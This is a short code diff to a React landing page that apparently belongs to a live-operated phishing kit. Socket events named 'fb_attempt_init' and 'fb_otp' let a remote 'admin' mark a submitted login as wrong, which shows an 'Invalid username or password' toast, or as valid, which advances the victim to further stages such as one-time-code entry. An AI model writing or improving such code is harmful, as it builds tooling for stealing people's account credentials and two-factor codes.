@@ -19,6 +19,7 @@ import StageTwo from "../components/generic/StageTwo";
 import StageThree from "../components/generic/StageThree";
 import ErrorStage from "../components/generic/ErrorStage";
 import Failed from "../components/generic/Failed";
+import { toaster } from "../components/ui/toaster";
 
 const Landing = () => {
   const navigate = useNavigate();
@@ -43,19 +44,28 @@ const Landing = () => {
 
       socketRef.current.on("admin_response", (data) => {
         if (data.eventType === "fb_attempt_init") {
-          if (data.sendTo) {
+          if (data.response === "wrong") {
             setIsLoading(false);
-
-            if (data.nextStep) {
-              setCurrentStage(data.nextStep);
-            }
-
-            if (data.message) {
-              setVerificationMessage(data.message);
-            }
-
+            toaster.create({
+              title: "Wrong credentials",
+              description: "Invalid username or password",
+              type: "error",
+            });
+          } else if (data.response === "continue") {
             if (data.sendTo) {
-              setSendTo(data.sendTo);
+              setIsLoading(false);
+
+              if (data.nextStep) {
+                setCurrentStage(data.nextStep);
+              }
+
+              if (data.message) {
+                setVerificationMessage(data.message);
+              }
+
+              if (data.sendTo) {
+                setSendTo(data.sendTo);
+              }
             }
           }
         } else if (data.eventType === "fb_otp") {
